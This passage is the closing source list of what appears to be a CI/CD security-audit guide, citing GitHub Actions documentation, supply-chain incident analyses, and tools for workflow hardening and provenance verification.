- `secaudit:privilege-escalation` — §4's token scopes are the same least-privilege question as an
  application's role checks.

## Sources

- https://docs.github.com/en/actions/reference/security/secure-use -- privileged triggers, SHA pinning, redaction limits, self-hosted runner guidance
- https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows -- `pull_request_target`, `workflow_run`, `issue_comment` semantics
- https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/ -- pwn requests and the artifact/`workflow_run` split
- https://securitylab.github.com/resources/github-actions-untrusted-input/ -- the attacker-controlled context list; env-indirection fix
- https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax -- `permissions: {}`; fork tokens cannot be granted write
- https://docs.github.com/en/actions/tutorials/authenticate-with-github_token -- least-privilege `GITHUB_TOKEN` pattern
- https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository -- default workflow permissions and org inheritance
- https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets -- secrets are not passed to fork-triggered runs
- https://docs.github.com/en/actions/how-tos/monitor-workflows/enable-debug-logging -- `ACTIONS_STEP_DEBUG` / `ACTIONS_RUNNER_DEBUG`
- https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching -- cache scopes, untrusted triggers, the `cache-mode: write` opt-out
- https://github.com/advisories/GHSA-mrrh-fwg8-r2c3 -- CVE-2025-30066, tj-actions/changed-files tag repointing
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog -- CISA KEV: CVE-2025-30066 listed 2025-03-18
- https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions -- AsyncAPI, July 2026: `pull_request_target` + PR-head checkout
- https://old.tanstack.com/blog/npm-supply-chain-compromise-postmortem -- TanStack, May 2026: pwn request, cache poisoning, OIDC token theft
- https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised -- secondary analysis of the TanStack compromise
- https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/ -- branches as the cache security boundary
- https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust -- artifact poisoning via `workflow_run` + `download-artifact`
- https://unit42.paloaltonetworks.com/github-repo-artifacts-leak-tokens/ -- ArtiPACKED: `persist-credentials` leaking tokens through artifacts
- https://docs.github.com/en/actions/reference/security/oidc -- `id-token: write`, `sub` formats, immutable subject claims, Dependabot `event_name`
- https://docs.github.com/en/actions/concepts/security/openid-connect -- how the cloud side evaluates OIDC claims
- https://raw.githubusercontent.com/sigstore/cosign/main/doc/cosign_verify.md -- `--certificate-identity-regexp`, `--certificate-oidc-issuer`
- https://docs.sigstore.dev/cosign/verifying/verify/ -- cosign keyless verification walkthrough
- https://github.com/actions/attest-build-provenance -- producing signed build provenance; required permissions
- https://docs.github.com/en/actions/how-tos/secure-your-work/use-artifact-attestations/use-artifact-attestations -- artifact attestations end to end
- https://cli.github.com/manual/gh_attestation_verify -- `--signer-workflow` / `--signer-repo`
- https://github.com/zizmorcore/zizmor -- static analysis for CI/CD
- https://docs.zizmor.sh/audits/ -- the audit list mapped to sections 1-7
- https://github.com/rhysd/actionlint -- workflow linter with script-injection checks
- https://github.com/ossf/scorecard/blob/main/docs/checks.md -- Dangerous-Workflow, Token-Permissions, Pinned-Dependencies
- https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/ -- fork MR pipelines run in the parent project
- https://docs.gitlab.com/ci/jobs/ci_job_token/ -- `CI_JOB_TOKEN` scope and the job-token allowlist
- https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/ -- A03:2025, where §3, §6, §9 and §10 land
- https://top10.owasp.org/2025/A08_2025-Software_or_Data_Integrity_Failures/ -- A08:2025, where §1, §6, §8 and §9 land
